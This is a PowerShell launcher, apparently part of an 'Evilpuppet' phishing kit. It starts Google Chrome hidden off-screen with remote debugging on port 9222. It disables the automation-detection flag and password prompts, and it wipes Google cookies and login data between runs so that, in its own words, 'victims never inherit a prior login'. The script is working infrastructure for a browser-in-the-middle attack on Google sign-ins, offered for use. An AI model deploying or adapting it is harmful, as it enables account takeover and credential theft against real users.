# Start real Google Chrome with remote debugging for Evilpuppet mirror (CDP).
# Window is placed off-screen so it does not appear on the desktop.
# Always wipe prior Google cookies/autofill so each stack start is a clean login.
$Root = Split-Path $PSScriptRoot -Parent
if (-not (Test-Path (Join-Path $Root 'puppet-bridge'))) { $Root = $PSScriptRoot }
$Profile = Join-Path $Root 'evilhooked\chrome-profile-cdp'
$Port = 9222
$Chrome = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
if (-not (Test-Path $Chrome)) {
  $Chrome = Join-Path $env:LOCALAPPDATA 'Google\Chrome\Application\chrome.exe'
}
if (-not (Test-Path $Chrome)) {
  Write-Error 'Google Chrome not found'
  exit 1
}
New-Item -ItemType Directory -Force -Path $Profile | Out-Null

$cdpUp = $false
try {
  $null = Invoke-RestMethod -Uri "http://127.0.0.1:$Port/json/version" -TimeoutSec 2
  $cdpUp = $true
} catch {
  $cdpUp = $false
}

Write-Host "Stopping prior CDP Chrome (if any)…"
Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -ErrorAction SilentlyContinue |
  Where-Object { $_.CommandLine -match 'chrome-profile-cdp|remote-debugging-port=9222' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep -Milliseconds 900

# Wipe Google session leftovers from the CDP profile so victims never inherit a prior login
function Clear-CdpProfileJunk {
  param([string]$Dir)
  $default = Join-Path $Dir 'Default'
  if (-not (Test-Path $default)) { return }
  $kill = @(
    'Cookies', 'Cookies-journal', 'Network Action Predictor', 'Network Action Predictor-journal',
    'Login Data', 'Login Data-journal', 'Login Data For Account', 'Web Data', 'Web Data-journal',
    'History', 'History-journal', 'Visited Links', 'Top Sites', 'Top Sites-journal',
    'Preferences', 'Secure Preferences'
  )
  foreach ($name in $kill) {
    $p = Join-Path $default $name
    if (Test-Path $p) { Remove-Item -Force -ErrorAction SilentlyContinue $p }
  }
  foreach ($sub in @('Network', 'Local Storage', 'Session Storage', 'IndexedDB', 'Service Worker', 'Cache', 'Code Cache', 'GPUCache')) {
    $p = Join-Path $default $sub
    if (Test-Path $p) { Remove-Item -Recurse -Force -ErrorAction SilentlyContinue $p }
  }
  Write-Host "Wiped CDP profile cookies/autofill under $default"
}
Clear-CdpProfileJunk -Dir $Profile

Write-Host "Starting Chrome CDP off-screen on port $Port (clean profile)"
Start-Process -FilePath $Chrome -ArgumentList @(
  "--remote-debugging-port=$Port",
  "--user-data-dir=$Profile",
  '--no-first-run',
  '--no-default-browser-check',
  '--disable-blink-features=AutomationControlled',
  '--disable-features=PasswordManagerOnboarding,AutofillServerCommunication',
  '--disable-save-password-bubble',
  '--password-store=basic',
  '--window-position=-32000,-32000',
  '--window-size=1366,768',
  'about:blank'
) | Out-Null

for ($i = 0; $i -lt 40; $i++) {
  try {
    $null = Invoke-RestMethod -Uri "http://127.0.0.1:$Port/json/version" -TimeoutSec 1
    Write-Host "Chrome CDP ready on port $Port (background, clean)"
    exit 0
  } catch {
    Start-Sleep -Milliseconds 250
  }
}
Write-Error 'Chrome CDP failed to start'
exit 1
